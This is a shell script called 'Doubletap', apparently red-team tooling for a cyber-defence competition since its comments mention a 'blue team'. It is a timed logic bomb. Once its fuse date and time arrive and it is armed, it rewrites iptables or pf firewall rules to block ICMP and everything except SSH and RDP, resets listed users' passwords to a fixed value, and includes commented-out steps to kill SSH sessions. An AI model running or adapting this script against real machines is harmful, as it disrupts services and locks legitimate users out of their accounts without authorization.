#!/bin/sh

fuse_date="2025-03-21"  # In format YYYY-MM-DD in America/New_York timezone
fuse_time="16:00:00"    # In format HH:MM:SS, using 24h time in America/New_York timezone
fuse_armed="false"      # DO NOT SET THIS TO TRUE UNLESS YOU WANT TO EXPLODE
log_location="./dt.txt" # Set to /dev/null for no output (and comment out line 14)
users="user1 user2 user3"
users_pwd="temppassword"

#########################
##### EXTRA SETUP #######
#########################

#touch $log_location
exec >>$log_location 2>&1 #append
#tail -f $log_location &  # This breaks non-interactively. TODO remove for deploy!

if [ "$(id -u)" -ne 0 ]; then # sh compatible
    echo "User is not root. Skill issue."
    exit 1
fi

# Convert HH:MM:SS into total seconds in a basic, sh compatible way
to_seconds() {
    IFS=:  # Set the field separator to colon
    set -- $1  # Split the input into positional parameters
    h=$1  # Hours
    m=$2  # Minutes
    s=$3  # Seconds
    echo $((h * 3600 + m * 60 + s))
}

# Start of loop

today=$(TZ=America/New_York date +"%Y-%m-%d")
current_time=$(TZ=America/New_York date +"%H:%M:%S")
fuse_seconds=$(to_seconds "$fuse_time")
current_seconds=$(to_seconds "$current_time")

echo "---------------------------------------------"
echo "  Doubletap - $today $current_time"

#########################
###### TIME CHECK #######
#########################

# Check if the date is March 21st, 2025, and the time is after 3 PM
if [ "$today" = "$fuse_date" ]; then
    if [ "$current_seconds" -ge "$fuse_seconds" ]; then
        echo "+++++++++++++++++++++++++++++++++++"
        echo "  DETONATION CRITERIA MET"
        echo "Found date $today and expected $fuse_date"
        echo "Found hour $current_time and expected $fuse_time"

        if [ "$fuse_armed" = "true" ]; then
            echo "  PROCEEDING WITH FULL KABOOM"
            # Kaboom.
            # Add firewall rules that blocks everything except default SSH and RDP ports in case of premature detonation
            # Kill all active sessions
            if command -v iptables >/dev/null 2>&1; then
                echo "iptables found. Configuring rules..."

                # Flush the MANGLE chain
                #iptables -t mangle -F

                # Set default ALLOW policy for the chain
                iptables -P INPUT ACCEPT
                iptables -P FORWARD ACCEPT
                iptables -P OUTPUT ACCEPT

                # Block all ICMP (ping) traffic
                iptables -A INPUT -p icmp -j DROP

                # Block all traffic except for ports 22 (SSH) and 3389 (RDP)
                iptables -A INPUT -p tcp --dport 22 -j ACCEPT
                iptables -A INPUT -p tcp --dport 3389 -j ACCEPT
                iptables -A INPUT -j DROP

                # Save iptables rules to persist after reboot - nvm, as we want an easily recoverable way
                #if command -v iptables-save >/dev/null 2>&1; then
                #    iptables-save > /etc/iptables/rules.v4
                #    echo "iptables rules saved."
                #else
                #    echo "iptables-save not found. Rules will not persist after reboot."
                #fi

                echo "iptables rules applied."
            fi

            # Freebsd - Check if pf is available
            if command -v pfctl >/dev/null 2>&1; then
                echo "pf found. Configuring rules..."

                # Define PF rules
                PF_RULES="/etc/pf.conf"

                # Write new firewall rules to /etc/pf.conf
                IFACE=$(ifconfig | awk '/^e[tn]/ {print $1; exit}')
                #old (bad bc possibly no egress interface): pass in on egress proto tcp from any to any port {22, 3389}
                cat > "$PF_RULES" <<EOF
# Block all traffic by default
block in all
block out all

# Allow incoming SSH (22) and RDP (3389)
pass in on $IFACE proto tcp from any to any port {22, 3389}

# Allow outgoing connections
pass out on egress proto tcp from any to any
pass out on egress proto udp from any to any

# Block all ICMP (ping)
block in proto icmp
EOF

                # Load the new rules
                pfctl -f "$PF_RULES"

                # Enable pf if not already enabled
                sysrc pf_enable="YES"
                service pf restart

                echo "PF firewall rules applied successfully."
            else
                echo "pf not found. FreeBSD requires pf for firewall rules."
            fi

            # Change users passwords
            for user in $users; do
                if id "$user" &>/dev/null; then
                    echo "$user:$users_pwd" | sudo chpasswd
                    echo "Password for $user changed successfully."
                else
                    echo "User $user does not exist. Skipping..."
                fi
            done

            # Kill all SSH sessions
            # seems to hang for some reason - commented out for now.
            #echo "Killing all SSH sessions..."
            #ps aux | grep "[s]shd: " | awk '{print $2}' | xargs -r kill -9

            # Delete persistance/kill this task
            # doesn't matter if blue team finds this because they can just delete this file
            # todo: unless this file is stabvested. stabvest should contain an auto-off after the fuse time
            echo "Deleting this script..."
            # Cleanup after explosion

        else
            echo "  ... where's the kaboom? FUSE NOT ARMED"
        fi
    else
        echo "Wrong time - found $current_time but expected $fuse_time or greater"
    fi
else
    echo "Wrong date - found $today but expected $fuse_date"
fi
# End of loop
